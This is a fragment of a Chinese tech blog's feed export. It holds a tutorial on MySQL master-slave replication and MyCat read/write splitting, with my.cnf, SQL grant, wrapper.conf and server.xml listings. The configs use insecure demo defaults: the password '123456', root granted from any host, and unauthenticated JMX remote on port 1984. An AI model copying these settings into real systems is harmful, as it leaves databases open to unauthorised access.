class="string">&quot;schemas&quot;</span>&gt;</span>mycatdb1,mycatdb2,mycatdb3,mycatdb4,mycatdb5,mycatdb6,mycatdb7,mycatdb8,mycatdb9<span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x5F00;&#x901A;user&#x666E;&#x901A;&#x7528;&#x6237;&#x8BBF;&#x95EE;mycatdb&#x8BBF;&#x95EE;&#x6743;&#x9650; mycatdbx&#x662F;&#x865A;&#x62DF;&#x7684;schema --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;schemas&quot;</span>&gt;</span>mycatdb1,mycatdb2,mycatdb3,mycatdb4,mycatdb5,mycatdb6,mycatdb7,mycatdb8,mycatdb9<span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;readOnly&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;schema.xml&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL数据库高级应用之读写分离</title>
    <link href="https://marnm.github.io//posts/490925f2/"/>
    <id>https://marnm.github.io//posts/490925f2/</id>
    <published>2022-06-07T04:46:08.000Z</published>
    <updated>2022-06-07T05:11:31.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL&#x6570;&#x636E;&#x5E93;&#x9AD8;&#x7EA7;&#x5E94;&#x7528;&#x4E4B;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x2014;&#x2014;MyCat&#x7BC7;"><a href="#MySQL&#x6570;&#x636E;&#x5E93;&#x9AD8;&#x7EA7;&#x5E94;&#x7528;&#x4E4B;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x2014;&#x2014;MyCat&#x7BC7;" class="headerlink" title="MySQL&#x6570;&#x636E;&#x5E93;&#x9AD8;&#x7EA7;&#x5E94;&#x7528;&#x4E4B;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x2014;&#x2014;MyCat&#x7BC7;"></a>MySQL&#x6570;&#x636E;&#x5E93;&#x9AD8;&#x7EA7;&#x5E94;&#x7528;&#x4E4B;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x2014;&#x2014;MyCat&#x7BC7;</h1><h2 id="&#x914D;&#x7F6E;MySQL&#x4E3B;&#x4ECE;"><a href="#&#x914D;&#x7F6E;MySQL&#x4E3B;&#x4ECE;" class="headerlink" title="&#x914D;&#x7F6E;MySQL&#x4E3B;&#x4ECE;"></a>&#x914D;&#x7F6E;MySQL&#x4E3B;&#x4ECE;</h2><h3 id="Master"><a href="#Master" class="headerlink" title="Master"></a>Master</h3><p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;<br></p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">symbolic-links</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">log-error</span>=/var/log/mysqld.log</span><br><span class="line"><span class="attr">pid-file</span>=/var/run/mysqld/mysqld.pid</span><br><span class="line"></span><br><span class="line"><span class="attr">bind-address</span>    = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user</span>=mysql</span><br><span class="line"></span><br><span class="line"><span class="attr">innodb_flush_log_at_trx_commit</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">sync_binlog</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-bin-master</span><br><span class="line"><span class="attr">server-id</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">binlog-do-db</span>=ha</span><br><span class="line"><span class="attr">binlog-ignore-db</span>=mysql</span><br><span class="line"><span class="attr">lower_case_table_names</span>=<span class="number">1</span></span><br><span class="line">skip-name-resolve</span><br><span class="line"></span><br><span class="line"><span class="attr">character-set-server</span>=utf8</span><br><span class="line"><span class="attr">collation-server</span>=utf8_general_ci</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x6388;&#x6743;&#x7528;&#x6237;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> ha;</span><br><span class="line"><span class="keyword">use</span> ha</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">test</span>(<span class="keyword">id</span> <span class="built_in">int</span>, <span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">replication</span> <span class="keyword">slave</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> root@<span class="string">&apos;%&apos;</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">&apos;123456&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">master</span> <span class="keyword">status</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p -B ha &gt; ha.sql</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Slave"><a href="#Slave" class="headerlink" title="Slave"></a>Slave</h3><p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br></p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">symbolic-links</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">log-error</span>=/var/log/mysqld.log</span><br><span class="line"><span class="attr">pid-file</span>=/var/run/mysqld/mysqld.pid</span><br><span class="line"></span><br><span class="line"><span class="attr">bind-address</span>    = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">log-bin</span>=mysql-bin</span><br><span class="line"><span class="attr">server-id</span>=<span class="number">3</span></span><br><span class="line"><span class="attr">binlog-do-db</span>=ha</span><br><span class="line"><span class="attr">binlog-ignore-db</span>=mysql</span><br><span class="line"><span class="attr">log_slave_updates</span>=<span class="number">1</span></span><br><span class="line">skip-name-resolve</span><br><span class="line"><span class="attr">lower_case_table_names</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">character-set-server</span>=utf8</span><br><span class="line"><span class="attr">collation-server</span>=utf8_general_ci</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BBE;&#x7F6E;&#x4E3B;&#x670D;&#x52A1;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">change</span> <span class="keyword">master</span> <span class="keyword">to</span> master_host=<span class="string">&apos;master_ip_addr&apos;</span>, master_user=<span class="string">&apos;root&apos;</span>, master_password=<span class="string">&apos;123456&apos;</span>, master_log_file=<span class="string">&apos;master_db_bin&apos;</span>;</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line"><span class="keyword">start</span> <span class="keyword">slave</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5BFC;&#x5165;Master&#x7684;&#x6570;&#x636E;&#x5E93;<br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p &lt; ha.sql</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x5B89;&#x88C5;&#x914D;&#x7F6E;MyCat"><a href="#&#x5B89;&#x88C5;&#x914D;&#x7F6E;MyCat" class="headerlink" title="&#x5B89;&#x88C5;&#x914D;&#x7F6E;MyCat"></a>&#x5B89;&#x88C5;&#x914D;&#x7F6E;MyCat</h2><h3 id="&#x5B89;&#x88C5;jdk&#xFF0C;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;"><a href="#&#x5B89;&#x88C5;jdk&#xFF0C;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;" class="headerlink" title="&#x5B89;&#x88C5;jdk&#xFF0C;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;"></a>&#x5B89;&#x88C5;jdk&#xFF0C;&#x914D;&#x7F6E;Java&#x73AF;&#x5883;&#x53D8;&#x91CF;</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/java</span><br><span class="line"></span><br><span class="line">tar -zxvf jdk-8u201-linux-x64.tar.gz -C /usr/java/</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line">JAVA_HOME=/usr/java/jdk1.8.0_201</span><br><span class="line">PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">CLASSPATH=$JAVA_HOME/jre/lib/ext:$JAVA_HOME/lib/tools.jar</span><br><span class="line">export PATH JAVA_HOME CLASSPATH</span><br><span class="line">MYCAT_HOME=/usr/local/mycat</span><br><span class="line">PATH=$MYCAT_HOME/bin:$PATH</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x5B89;&#x88C5;MyCat"><a href="#&#x5B89;&#x88C5;MyCat" class="headerlink" title="&#x5B89;&#x88C5;MyCat"></a>&#x5B89;&#x88C5;MyCat</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf Mycat-server-1.6.7.3-release-20190927161129-linux.tar.gz -C /usr/local/</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x4FEE;&#x6539;wrapper.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#********************************************************************</span></span><br><span class="line"><span class="comment"># Wrapper Properties</span></span><br><span class="line"><span class="comment">#********************************************************************</span></span><br><span class="line"><span class="comment"># Java Application</span></span><br><span class="line"><span class="comment"># &#x6539;&#x6210;JDK&#x5B89;&#x88C5;&#x76EE;&#x5F55;</span></span><br><span class="line">wrapper.java.command=/usr/java/jdk1.8.0_201/bin/java</span><br><span class="line">wrapper.working.dir=..</span><br><span class="line"></span><br><span class="line"><span class="comment"># Java Main class.  This class must implement the WrapperListener interface</span></span><br><span class="line"><span class="comment">#  or guarantee that the WrapperManager class is initialized.  Helper</span></span><br><span class="line"><span class="comment">#  classes are provided to do this for you.  See the Integration section</span></span><br><span class="line"><span class="comment">#  of the documentation for details.</span></span><br><span class="line">wrapper.java.mainclass=org.tanukisoftware.wrapper.WrapperSimpleApp</span><br><span class="line">set.default.REPO_DIR=lib</span><br><span class="line">set.APP_BASE=.</span><br><span class="line"></span><br><span class="line"><span class="comment"># Java Classpath (include wrapper.jar)  Add class path elements as</span></span><br><span class="line"><span class="comment">#  needed starting from 1</span></span><br><span class="line">wrapper.java.classpath.1=lib/wrapper.jar</span><br><span class="line">wrapper.java.classpath.2=conf</span><br><span class="line">wrapper.java.classpath.3=%REPO_DIR%/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># Java Library Path (location of Wrapper.DLL or libwrapper.so)</span></span><br><span class="line">wrapper.java.library.path.1=lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># Java Additional Parameters</span></span><br><span class="line"><span class="comment">#wrapper.java.additional.1=</span></span><br><span class="line">wrapper.java.additional.1=-DMYCAT_HOME=.</span><br><span class="line">wrapper.java.additional.2=-server</span><br><span class="line">wrapper.java.additional.3=-XX:MaxPermSize=64M</span><br><span class="line">wrapper.java.additional.4=-XX:+AggressiveOpts</span><br><span class="line">wrapper.java.additional.5=-XX:MaxDirectMemorySize=2G</span><br><span class="line">wrapper.java.additional.6=-Dcom.sun.management.jmxremote</span><br><span class="line">wrapper.java.additional.7=-Dcom.sun.management.jmxremote.port=1984</span><br><span class="line">wrapper.java.additional.8=-Dcom.sun.management.jmxremote.authenticate=false</span><br><span class="line">wrapper.java.additional.9=-Dcom.sun.management.jmxremote.ssl=false</span><br><span class="line"><span class="comment"># &#x5982;&#x679C;MyCat&#x8FD8;&#x662F;&#x8D77;&#x4E0D;&#x6765;&#x8C03;&#x6574;&#x4E00;&#x4E0B;&#x6027;&#x80FD;&#x8981;&#x6C42;</span></span><br><span class="line">wrapper.java.additional.10=-Xmx640M</span><br><span class="line">wrapper.java.additional.11=-Xms256M</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial Java Heap Size (in MB)</span></span><br><span class="line"><span class="comment">#wrapper.java.initmemory=3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Maximum Java Heap Size (in MB)</span></span><br><span class="line"><span class="comment">#wrapper.java.maxmemory=64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Application parameters.  Add parameters as needed starting from 1</span></span><br><span class="line">wrapper.app.parameter.1=io.mycat.MycatStartup</span><br><span class="line">wrapper.app.parameter.2=start</span><br><span class="line"></span><br><span class="line"><span class="comment">#********************************************************************</span></span><br><span class="line"><span class="comment"># Wrapper Logging Properties</span></span><br><span class="line"><span class="comment">#********************************************************************</span></span><br><span class="line"><span class="comment"># Format of output for the console.  (See docs for formats)</span></span><br><span class="line">wrapper.console.format=PM</span><br><span class="line"></span><br><span class="line"><span class="comment"># Log Level for console output.  (See docs for log levels)</span></span><br><span class="line">wrapper.console.loglevel=INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Log file to use for wrapper output logging.</span></span><br><span class="line">wrapper.logfile=logs/wrapper.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format of output for the log file.  (See docs for formats)</span></span><br><span class="line">wrapper.logfile.format=LPTM</span><br><span class="line"></span><br><span class="line"><span class="comment"># Log Level for log file output.  (See docs for log levels)</span></span><br><span class="line">wrapper.logfile.loglevel=INFO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Maximum size that the log file will be allowed to grow to before</span></span><br><span class="line"><span class="comment">#  the log is rolled. Size is specified in bytes.  The default value</span></span><br><span class="line"><span class="comment">#  of 0, disables log rolling.  May abbreviate with the &apos;k&apos; (kb) or</span></span><br><span class="line"><span class="comment">#  &apos;m&apos; (mb) suffix.  For example: 10m = 10 megabytes.</span></span><br><span class="line">wrapper.logfile.maxsize=512m</span><br><span class="line"></span><br><span class="line"><span class="comment"># Maximum number of rolled log files which will be allowed before old</span></span><br><span class="line"><span class="comment">#  files are deleted.  The default value of 0 implies no limit.</span></span><br><span class="line">wrapper.logfile.maxfiles=30</span><br><span class="line"></span><br><span class="line"><span class="comment"># Log Level for sys/event log output.  (See docs for log levels)</span></span><br><span class="line">wrapper.syslog.loglevel=NONE</span><br><span class="line"></span><br><span class="line"><span class="comment">#********************************************************************</span></span><br><span class="line"><span class="comment"># Wrapper Windows Properties</span></span><br><span class="line"><span class="comment">#********************************************************************</span></span><br><span class="line"><span class="comment"># Title to use when running as a console</span></span><br><span class="line">wrapper.console.title=Mycat-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#********************************************************************</span></span><br><span class="line"><span class="comment"># Wrapper Windows NT/2000/XP Service Properties</span></span><br><span class="line"><span class="comment">#********************************************************************</span></span><br><span class="line"><span class="comment"># WARNING - Do not modify any of these properties when an application</span></span><br><span class="line"><span class="comment">#  using this configuration file has been installed as a service.</span></span><br><span class="line"><span class="comment">#  Please uninstall the service before modifying this section.  The</span></span><br><span class="line"><span class="comment">#  service can then be reinstalled.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name of the service</span></span><br><span class="line">wrapper.ntservice.name=mycat</span><br><span class="line"></span><br><span class="line"><span class="comment"># Display name of the service</span></span><br><span class="line">wrapper.ntservice.displayname=Mycat-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># Description of the service</span></span><br><span class="line">wrapper.ntservice.description=The project of Mycat-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># Service dependencies.  Add dependencies as needed starting from 1</span></span><br><span class="line">wrapper.ntservice.dependency.1=</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mode in which the service is installed.  AUTO_START or DEMAND_START</span></span><br><span class="line">wrapper.ntservice.starttype=AUTO_START</span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow the service to interact with the desktop.</span></span><br><span class="line">wrapper.ntservice.interactive=false</span><br><span class="line"></span><br><span class="line">wrapper.ping.timeout=120</span><br><span class="line">configuration.directory.in.classpath.first=conf</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x4FEE;&#x6539;server.xml</strong><br></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- - - Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">        - you may not use this file except in compliance with the License. - You</span></span><br><span class="line"><span class="comment">        may obtain a copy of the License at - - http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">        - - Unless required by applicable law or agreed to in writing, software -</span></span><br><span class="line"><span class="comment">        distributed under the License is distributed on an &quot;AS IS&quot; BASIS, - WITHOUT</span></span><br><span class="line"><span class="comment">        WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. - See the</span></span><br><span class="line"><span class="comment">        License for the specific language governing permissions and - limitations</span></span><br><span class="line"><span class="comment">        under the License. --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE mycat:server SYSTEM &quot;server.dtd&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mycat:server</span> <span class="attr">xmlns:mycat</span>=<span class="string">&quot;http://io.mycat/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">system</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;nonePasswordLogin&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span> <span class="comment">&lt;!-- 0&#x4E3A;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646;&#x3001;1&#x4E3A;&#x4E0D;&#x9700;&#x8981;&#x5BC6;&#x7801;&#x767B;&#x9646; ,&#x9ED8;&#x8BA4;&#x4E3A;0&#xFF0C;&#x8BBE;&#x7F6E;&#x4E3A;1&#x5219;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x8D26;&#x6237;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useHandshakeV10&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useSqlStat&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span>  <span class="comment">&lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5B9E;&#x65F6;&#x7EDF;&#x8BA1;&#x3001;0&#x4E3A;&#x5173;&#x95ED; --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;useGlobleTableCheck&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span>  <span class="comment">&lt;!-- 1&#x4E3A;&#x5F00;&#x542F;&#x5168;&#x52A0;&#x73ED;&#x4E00;&#x81F4;&#x6027;&#x68C0;&#x6D4B;&#x3001;0&#x4E3A; &#x5173;&#x95ED; --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlExecuteTimeout&quot;</span>&gt;</span>300<span class="tag">&lt;/<span class="name">property</span>&gt;</span>  <span class="comment">&lt;!-- SQL &#x6267;&#x884C;&#x8D85;&#x65F6; &#x5355;&#x4F4D;:&#x79D2;--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sequnceHandlerType&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&lt;property name=&quot;sequnceHandlerPattern&quot;&gt;(?:(\s*next\s+value\s+for\s*MYCATSEQ_(\w+))(,|\)|\s)*)+&lt;/property&gt;--&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--&#x5FC5;&#x987B;&#x5E26;&#x6709;MYCATSEQ_&#x6216;&#x8005; mycatseq_&#x8FDB;&#x5165;&#x5E8F;&#x5217;&#x5339;&#x914D;&#x6D41;&#x7A0B; &#x6CE8;&#x610F;MYCATSEQ_&#x6709;&#x7A7A;&#x683C;&#x7684;&#x60C5;&#x51B5;--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sequnceHandlerPattern&quot;</span>&gt;</span>(?:(\s*next\s+value\s+for\s*MYCATSEQ_(\w+))(,|\)|\s)*)+<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;subqueryRelationshipCheck&quot;</span>&gt;</span>false<span class="tag">&lt;/<span class="name">property</span>&gt;</span> <span class="comment">&lt;!-- 